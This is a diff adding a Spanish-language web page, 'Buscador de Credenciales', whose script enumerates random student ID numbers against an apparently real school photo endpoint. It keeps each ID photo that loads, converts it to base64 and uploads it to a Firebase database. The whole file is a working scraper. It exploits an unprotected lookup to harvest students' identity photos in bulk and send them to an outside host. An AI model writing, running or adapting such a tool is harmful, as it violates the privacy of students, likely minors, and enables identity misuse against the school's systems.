@@ -1,0 +1,385 @@
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Buscador de Credenciales</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 20px;
+            color: #333;
+        }
+
+        h1 {
+            text-align: center;
+            color: #2c3e50;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .control-panel {
+            margin-bottom: 20px;
+            padding: 15px;
+            background-color: #f8f9fa;
+            border-radius: 5px;
+        }
+
+        button {
+            padding: 10px 15px;
+            background-color: #3498db;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1em;
+            margin-right: 10px;
+            margin-bottom: 10px;
+        }
+
+        button:hover {
+            background-color: #2980b9;
+        }
+
+        button:disabled {
+            background-color: #95a5a6;
+            cursor: not-allowed;
+        }
+
+        #status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 5px;
+        }
+
+        .status-info {
+            background-color: #d4edda;
+            color: #155724;
+        }
+
+        .status-error {
+            background-color: #f8d7da;
+            color: #721c24;
+        }
+
+        #results {
+            margin-top: 20px;
+        }
+
+        .result-item {
+            padding: 10px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        #imagenContainer {
+            text-align: center;
+            margin-top: 20px;
+            padding: 10px;
+            background-color: white;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            display: none;
+        }
+
+        #imagenCredencial {
+            max-width: 100%;
+            height: auto;
+            border-radius: 5px;
+        }
+
+        #progressBar {
+            width: 100%;
+            background-color: #e0e0e0;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+
+        #progressBarFill {
+            height: 20px;
+            background-color: #4CAF50;
+            border-radius: 5px;
+            width: 0%;
+            transition: width 0.3s;
+        }
+
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Buscador de Credenciales</h1>
+        
+        <div class="control-panel">
+            <div>
+                <button id="startSearch">Iniciar Búsqueda Aleatoria</button>
+                <button id="stopSearch" disabled>Detener Búsqueda</button>
+                <button id="downloadFound" disabled>Descargar Encontradas</button>
+            </div>
+            
+            <div>
+                <label for="searchRange">Rango de búsqueda:</label>
+                <input type="number" id="minRange" placeholder="Mínimo" value="2300000" style="width: 80px;">
+                <input type="number" id="maxRange" placeholder="Máximo" value="2399999" style="width: 80px;">
+            </div>
+            
+            <div>
+                <label for="batchSize">Matrículas por lote:</label>
+                <input type="number" id="batchSize" value="100" min="1" max="1000" style="width: 60px;">
+            </div>
+            
+            <div id="progressBar">
+                <div id="progressBarFill"></div>
+            </div>
+            
+            <div class="stats">
+                <div>Probadas: <span id="triedCount">0</span></div>
+                <div>Encontradas: <span id="foundCount">0</span></div>
+                <div>Guardadas: <span id="savedCount">0</span></div>
+            </div>
+        </div>
+        
+        <div id="status"></div>
+        
+        <div id="results"></div>
+        
+        <div id="imagenContainer">
+            <img id="imagenCredencial" src="" alt="Foto de credencial encontrada">
+        </div>
+    </div>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    
+    <script>
+        // Configuración de Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyDl4xR1H9Q0Q2Q2Q2Q2Q2Q2Q2Q2Q2Q2Q2Q",
+            authDomain: "fotocredencial-30d54.firebaseapp.com",
+            databaseURL: "https://fotocredencial-30d54-default-rtdb.firebaseio.com",
+            projectId: "fotocredencial-30d54",
+            storageBucket: "fotocredencial-30d54.appspot.com",
+            messagingSenderId: "123456789012",
+            appId: "1:123456789012:web:abcdef1234567890abcdef"
+        };
+        
+        // Inicializar Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        
+        // Variables de estado
+        let isSearching = false;
+        let searchInterval;
+        let triedMatriculas = new Set();
+        let foundMatriculas = [];
+        let savedMatriculas = [];
+        
+        // Elementos del DOM
+        const startSearchBtn = document.getElementById('startSearch');
+        const stopSearchBtn = document.getElementById('stopSearch');
+        const downloadFoundBtn = document.getElementById('downloadFound');
+        const statusDiv = document.getElementById('status');
+        const resultsDiv = document.getElementById('results');
+        const triedCountSpan = document.getElementById('triedCount');
+        const foundCountSpan = document.getElementById('foundCount');
+        const savedCountSpan = document.getElementById('savedCount');
+        const progressBarFill = document.getElementById('progressBarFill');
+        
+        // Función para generar un número aleatorio en un rango
+        function getRandomInt(min, max) {
+            min = Math.ceil(min);
+            max = Math.floor(max);
+            return Math.floor(Math.random() * (max - min + 1)) + min;
+        }
+        
+        // Función para verificar si una matrícula existe
+        async function checkMatricula(matricula) {
+            return new Promise((resolve) => {
+                const img = new Image();
+                img.onload = function() {
+                    // Si la imagen se carga correctamente y no es la imagen por defecto
+                    if (this.naturalWidth > 100 && this.naturalHeight > 100) {
+                        resolve(true);
+                    } else {
+                        resolve(false);
+                    }
+                };
+                img.onerror = function() {
+                    resolve(false);
+                };
+                img.src = `https://apps-3.cobachbc.edu.mx/CompetenciasGenericas/Ajax/GetFotoCredencial?pMatricula=${matricula}&t=${Date.now()}`;
+            });
+        }
+        
+        // Función para guardar una matrícula en Firebase
+        async function saveMatricula(matricula) {
+            try {
+                // Convertir la imagen a base64
+                const base64Image = await getImageAsBase64(matricula);
+                
+                // Guardar en Firebase
+                await database.ref('credenciales/' + matricula).set({
+                    matricula: matricula,
+                    imagen: base64Image,
+                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                });
+                
+                return true;
+            } catch (error) {
+                console.error("Error al guardar:", error);
+                return false;
+            }
+        }
+        
+        // Función para convertir imagen a base64
+        function getImageAsBase64(matricula) {
+            return new Promise((resolve, reject) => {
+                const img = new Image();
+                img.crossOrigin = 'Anonymous';
+                img.onload = function() {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = img.naturalWidth;
+                    canvas.height = img.naturalHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(img, 0, 0);
+                    resolve(canvas.toDataURL('image/jpeg'));
+                };
+                img.onerror = reject;
+                img.src = `https://apps-3.cobachbc.edu.mx/CompetenciasGenericas/Ajax/GetFotoCredencial?pMatricula=${matricula}&t=${Date.now()}`;
+            });
+        }
+        
+        // Función para mostrar una credencial encontrada
+        function displayFoundCredencial(matricula) {
+            const resultItem = document.createElement('div');
+            resultItem.className = 'result-item';
+            resultItem.innerHTML = `
+                <span>Matrícula: ${matricula}</span>
+                <button onclick="viewCredencial('${matricula}')">Ver</button>
+            `;
+            resultsDiv.appendChild(resultItem);
+        }
+        
+        // Función para ver una credencial
+        window.viewCredencial = function(matricula) {
+            const imagenContainer = document.getElementById('imagenContainer');
+            const imagenCredencial = document.getElementById('imagenCredencial');
+            
+            imagenCredencial.src = `https://apps-3.cobachbc.edu.mx/CompetenciasGenericas/Ajax/GetFotoCredencial?pMatricula=${matricula}`;
+            imagenContainer.style.display = 'block';
+        };
+        
+        // Función principal de búsqueda
+        async function searchBatch() {
+            if (!isSearching) return;
+            
+            const minRange = parseInt(document.getElementById('minRange').value) || 2300000;
+            const maxRange = parseInt(document.getElementById('maxRange').value) || 2399999;
+            const batchSize = parseInt(document.getElementById('batchSize').value) || 100;
+            
+            let batchPromises = [];
+            
+            for (let i = 0; i < batchSize; i++) {
+                let matricula;
+                do {
+                    matricula = getRandomInt(minRange, maxRange).toString().padStart(8, '0');
+                } while (triedMatriculas.has(matricula));
+                
+                triedMatriculas.add(matricula);
+                batchPromises.push(checkMatricula(matricula).then(exists => ({ matricula, exists })));
+            }
+            
+            const batchResults = await Promise.all(batchPromises);
+            const foundInBatch = batchResults.filter(result => result.exists).map(result => result.matricula);
+            
+            // Actualizar estadísticas
+            triedCountSpan.textContent = triedMatriculas.size;
+            foundCountSpan.textContent = foundMatriculas.length + foundInBatch.length;
+            progressBarFill.style.width = `${(triedMatriculas.size / (maxRange - minRange + 1)) * 100}%`;
+            
+            // Procesar encontradas
+            for (const matricula of foundInBatch) {
+                foundMatriculas.push(matricula);
+                displayFoundCredencial(matricula);
+                
+                // Intentar guardar en Firebase
+                const saved = await saveMatricula(matricula);
+                if (saved) {
+                    savedMatriculas.push(matricula);
+                    savedCountSpan.textContent = savedMatriculas.length;
+                }
+            }
+            
+            // Actualizar estado
+            if (foundInBatch.length > 0) {
+                statusDiv.textContent = `¡Encontradas ${foundInBatch.length} nuevas credenciales en este lote!`;
+                statusDiv.className = 'status-info';
+                downloadFoundBtn.disabled = false;
+            }
+        }
+        
+        // Event listeners
+        startSearchBtn.addEventListener('click', () => {
+            isSearching = true;
+            startSearchBtn.disabled = true;
+            stopSearchBtn.disabled = false;
+            statusDiv.textContent = 'Búsqueda iniciada...';
+            statusDiv.className = 'status-info';
+            
+            // Limpiar resultados anteriores si es una nueva búsqueda
+            if (triedMatriculas.size === 0) {
+                resultsDiv.innerHTML = '';
+            }
+            
+            // Configurar intervalo de búsqueda
+            searchInterval = setInterval(searchBatch, 3000);
+            searchBatch(); // Ejecutar inmediatamente el primer lote
+        });
+        
+        stopSearchBtn.addEventListener('click', () => {
+            isSearching = false;
+            clearInterval(searchInterval);
+            startSearchBtn.disabled = false;
+            stopSearchBtn.disabled = true;
+            statusDiv.textContent = 'Búsqueda detenida.';
+            statusDiv.className = 'status-info';
+        });
+        
+        downloadFoundBtn.addEventListener('click', async () => {
+            if (foundMatriculas.length === 0) return;
+            
+            statusDiv.textContent = 'Preparando descarga de credenciales encontradas...';
+            statusDiv.className = 'status-info';
+            
+            try {
+                // Aquí podrías implementar la descarga masiva
+                // Por ahora solo mostramos un mensaje
+                statusDiv.textContent = `Se encontraron ${foundMatriculas.length} credenciales. ${savedMatriculas.length} guardadas en Firebase.`;
+                
+                // Mostrar todas las credenciales encontradas
+                for (const matricula of foundMatriculas) {
+                    displayFoundCredencial(matricula);
+                }
+            } catch (error) {
+                statusDiv.textContent = 'Error al preparar la descarga: ' + error.message;
+                statusDiv.className = 'status-error';
+            }
+        });
+    </script>
+</body>
+</html>
